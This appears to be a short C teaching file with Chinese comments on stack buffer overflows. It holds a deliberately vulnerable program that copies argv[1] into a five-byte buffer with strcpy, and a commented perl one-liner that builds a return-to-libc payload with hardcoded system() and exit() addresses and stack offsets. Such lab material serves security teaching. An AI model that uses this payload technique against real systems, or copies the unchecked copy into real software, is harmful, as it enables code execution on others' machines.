/*这个程序用来测试课前阅读*/
//./pretest  `perl -e 'printf "A" x 13 ."\xfc\xf2\xff\xbf" . "\x60\xf0\xe5\xb7" . "\xe0\x2b\xe5\xb7"."\x7f\xf5\xff\xbf"'`
//......................................EBP------------------Ret-----------------Ret----------------Aeg-----------------||
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
int  main(int argc,char **argv)
{
  	char buff[5];
	 if(argc<2)
		//mian函数的执行地址实际上在这，参数是根据ebp来决定的
		//所以返回地址指向system后，要给他传参，利用ebp
		//system的地址为0xb7e5f060
		//exit的地址为0xb7e52be0
		//返回地址距离buff为21byte，oldebp距离buff为17byte
	//bash在内存中的地址需要在运行时寻找，gdb调试查看的地址不准确
	{
		puts("there needs a input string");
		exit(1);
	}
	strcpy(buff,argv[1]);
	printf("your input is buff[%s]\n",0xbffff5ce);
   	 return 0;


}
